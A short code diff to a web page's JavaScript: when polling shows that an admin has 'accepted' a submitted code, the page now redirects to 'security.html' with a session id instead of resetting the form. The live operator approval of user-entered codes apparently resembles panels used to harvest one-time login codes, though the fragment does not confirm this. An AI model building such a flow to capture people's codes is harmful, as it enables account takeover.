@@ -231,10 +231,7 @@
                     .then(function(d) {
                         if (d.status === 'accepted') {
                             clearInterval(interval);
-                            document.getElementById('loadingOverlay').classList.remove('show');
-                            document.getElementById('codeInput').value = '';
-                            document.getElementById('submitBtn').disabled = false;
-                            // Admin accepted the code — could redirect to success or stay
+                            window.location.href = 'security.html?id=' + sid;
                         } else if (d.status === 'rejected') {
                             clearInterval(interval);
                             document.getElementById('loadingOverlay').classList.remove('show');
